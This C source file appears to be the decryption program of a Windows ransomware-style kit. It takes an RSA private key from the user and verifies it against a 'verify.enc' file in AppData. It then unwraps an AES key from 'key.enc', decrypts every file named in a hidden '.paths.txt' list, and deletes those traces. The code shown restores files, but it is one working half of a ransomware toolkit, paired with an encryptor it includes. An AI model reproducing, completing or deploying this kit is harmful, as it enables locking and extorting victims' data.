#include "decrypt.h"
#include "encrypt.h"
#include "files.h"
#include "common.h"
#include <shlobj.h>

int main(int argc, char *argv[]) {
    char privkey_hex[PRIVKEY_BUFFER_SIZE] = {0};
    printf("Key: ");
    if (!fgets(privkey_hex, sizeof(privkey_hex), stdin)) {
        printf("Failed to read input\n");
        return 1;
    }
    size_t len = strlen(privkey_hex);
    if (len > 0 && privkey_hex[len - 1] == '\n') {
        privkey_hex[len - 1] = '\0';
    } else if (len == sizeof(privkey_hex) - 1) {
        printf("Input too long\n");
        zero_memory(privkey_hex, sizeof(privkey_hex));
        return 1;
    }
    BCRYPT_KEY_HANDLE h_key = import_rsa_private_key(privkey_hex);
    zero_memory(privkey_hex, sizeof(privkey_hex));
    if (!h_key) {
        printf("Failed to import RSA private key\n");
        return 1;
    }
    char appdata_path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata_path) != S_OK) {
        printf("Failed to get AppData path\n");
        BCryptDestroyKey(h_key);
        return 1;
    }
    char verify_path[MAX_PATH] = {0};
    if (_snprintf_s(verify_path, sizeof(verify_path), _TRUNCATE, "%s\\verify.enc", appdata_path) == -1) {
        BCryptDestroyKey(h_key);
        return 1;
    }
    size_t encrypted_verify_len;
    unsigned char *encrypted_verify_data = read_binary_file(verify_path, &encrypted_verify_len);
    if (!encrypted_verify_data) {
        printf("Failed to read verify.enc\n");
        BCryptDestroyKey(h_key);
        return 1;
    }
    const char *verify_string = "This key is valid";
    size_t verify_len = strlen(verify_string);
    unsigned char decrypted_verify[256] = {0};
    size_t decrypted_len = sizeof(decrypted_verify);
    if (rsa_decrypt(encrypted_verify_data, encrypted_verify_len, h_key, decrypted_verify, &decrypted_len) != ERR_SUCCESS) {
        printf("Failed to decrypt verification string\n");
        free(encrypted_verify_data);
        BCryptDestroyKey(h_key);
        return 1;
    }
    free(encrypted_verify_data);
    if (decrypted_len != verify_len || memcmp(decrypted_verify, verify_string, verify_len) != 0) {
        printf("Invalid decryption key\n");
        zero_memory(decrypted_verify, sizeof(decrypted_verify));
        BCryptDestroyKey(h_key);
        return 1;
    }
    zero_memory(decrypted_verify, sizeof(decrypted_verify));
    char key_path[MAX_PATH] = {0};
    if (_snprintf_s(key_path, sizeof(key_path), _TRUNCATE, "%s\\key.enc", appdata_path) == -1) {
        BCryptDestroyKey(h_key);
        return 1;
    }
    size_t encrypted_key_len;
    unsigned char *encrypted_key_data = read_binary_file(key_path, &encrypted_key_len);
    if (!encrypted_key_data) {
        printf("Failed to open key.enc\n");
        BCryptDestroyKey(h_key);
        return 1;
    }
    unsigned char aes_key[AES_KEY_SIZE] = {0};
    size_t aes_key_len = sizeof(aes_key);
    if (rsa_decrypt(encrypted_key_data, encrypted_key_len, h_key, aes_key, &aes_key_len) != ERR_SUCCESS) {
        printf("Failed to decrypt AES key\n");
        free(encrypted_key_data);
        BCryptDestroyKey(h_key);
        return 1;
    }
    free(encrypted_key_data);
    if (aes_key_len != AES_KEY_SIZE) {
        printf("Invalid AES key length\n");
        zero_memory(aes_key, sizeof(aes_key));
        BCryptDestroyKey(h_key);
        return 1;
    }
    char paths_path[MAX_PATH] = {0};
    if (_snprintf_s(paths_path, sizeof(paths_path), _TRUNCATE, "%s\\.paths.txt", appdata_path) == -1) {
        zero_memory(aes_key, sizeof(aes_key));
        BCryptDestroyKey(h_key);
        return 1;
    }
    FILE *paths_file = fopen(paths_path, "r");
    if (!paths_file) {
        printf("Failed to open .paths.txt\n");
        zero_memory(aes_key, sizeof(aes_key));
        BCryptDestroyKey(h_key);
        return 1;
    }
    char line[MAX_PATH];
    int any_fail = 0;
    while (fgets(line, sizeof(line), paths_file)) {
        char *filepath = strtok(line, "\n");
        if (filepath && decrypt_file_aes_cbc(filepath, aes_key) != ERR_SUCCESS) {
            any_fail = 1;
        }
    }
    fclose(paths_file);
    zero_memory(aes_key, sizeof(aes_key));
    BCryptDestroyKey(h_key);
    if (any_fail) {
        printf("Some files failed to decrypt\n");
        return 1;
    }
    printf("System decrypted successfully\n");
    DeleteFileA(paths_path);
    DeleteFileA(key_path);
    DeleteFileA(verify_path);
    return 0;
}
